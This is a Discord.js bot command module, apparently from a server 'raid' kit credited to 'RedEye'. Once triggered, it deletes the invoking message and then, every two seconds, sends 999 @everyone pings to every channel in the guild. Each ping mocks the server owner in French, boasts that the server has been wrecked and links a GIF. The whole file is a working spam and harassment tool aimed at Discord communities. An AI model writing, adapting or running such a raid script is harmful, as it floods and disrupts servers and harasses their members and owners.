const { MessageEmbed } = require("discord.js")
const Discord = require("discord.js");

module.exports = {
    name: "ms",
    run: async (client, message, args) => {
        if (message.deletable) message.delete();
      
    
                setInterval(function () {
                    message.channel.send("Sending...");
                    for (let i = 0; i < 999; i++) {
                        message.guild.channels.cache.forEach((ch) => ch.send(`@everyone ${message.guild.owner.user.tag} c'est fait bz son serv par || ${args} - avec le script RedEye Dev Par Registre ||||
                        >>> https://media.discordapp.net/attachments/813337619559350272/814101652881670204/IncompleteImaginativeFairybluebird-size_restricted.gif`).catch((err) => { console.log(("Error Found: " + err)) }))
                    }
                }, 2000);
           
    }
}